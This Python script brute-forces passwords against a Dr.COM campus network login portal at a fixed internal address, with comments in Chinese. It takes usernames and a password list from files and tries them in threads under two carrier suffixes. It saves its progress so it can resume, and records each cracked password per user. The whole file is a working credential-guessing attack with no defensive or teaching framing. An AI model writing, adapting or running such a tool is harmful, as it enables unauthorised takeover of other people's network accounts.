import time
import requests
import threading
import json
import os

MAXTHREADNUM = 2  # 线程数量
correct_password = None  # 用于线程储存正确pwd


def test(usrname, password, plm):
    # 测试pwd是否正确
    url = f"http://10.51.2.20/drcom/login"

    params = {
        "callback": "dr1003",
        "DDDDD": "w" + usrname + "@" + plm,
        "upass": password,
        "0MKKey": 123456,
        "R1": 0,
        "R2": None,
        "R3": 0,
        "R6": 0,
        "para": "00",
        "v6ip": None,
        "terminal_type": 1,
        "lang": "zh-cn",
        "jsVersion": "4.1.3",
        "v": 2390,
        "lang": "zh",
    }

    result = requests.get(url, params=params)

    if result.status_code == 200:  # 测试连接是否正确
        if '"result":1' in result.text:  # 返回值为true
            return True
        else:
            return False
    else:
        raise requests.exceptions.ConnectionError(result.status_code)


def thread_func(usrname, password):
    global MAXTHREADNUM, correct_password
    MAXTHREADNUM -= 1

    while True:
        try:
            result = test(usrname, password, "cmcc") or test(usrname, password, "njxy")

            if correct_password:  # 如果正确pwd已经存在，则不再执行
                break

            if result:
                correct_password = password
            else:
                print(f"{(usrname, password)}登录失败")

            break

        except requests.exceptions.ConnectionError:
            print(f"{(usrname, password)}连接失败")

    MAXTHREADNUM += 1


# 检查result文件是否存在
if os.path.exists("result.json"):
    results = json.load(open("result.json", "r"))
    current_username = results["current_username"]
    current_password = results["current_password"]
else:  # 使用默认内容
    results = {"current_username": 0, "current_password": 0}
    current_username = 0
    current_password = 0

# 读取处理用户名
with open("username.txt", "r") as f:
    username_list = f.readlines()
username_list = [username.strip() for username in username_list]
username_list = username_list[current_username:]

for username in username_list:
    couter = current_password  # 记录当前密码索引
    with open("password.txt", "r") as f:
        f.seek(current_password * 8)  # 设置指针位置
        while True:
            password = f.readline().strip()
            if not password:  # 如果密码文件读取完毕, 则退出循环
                break

            while MAXTHREADNUM <= 0:  # 如果线程数量已满, 则等待
                pass

            threading.Thread(target=thread_func, args=(username, password)).start()

            couter += 1
            if couter % 128 == 0:  # 当密码索引达到128记录当前密码索引
                results["current_password"] = couter
                json.dump(results, open("result.json", "w"))

            if correct_password:  # 如果正确pwd已经存在, 则退出循环
                break

    # 处理, 重置参数
    time.sleep(5)
    print(f"\n{username} 的密码为 {correct_password}")
    results[username] = correct_password
    results["current_username"] += 1
    results["current_password"] = 0
    correct_password = None
    current_password = 0
    json.dump(results, open("result.json", "w"))
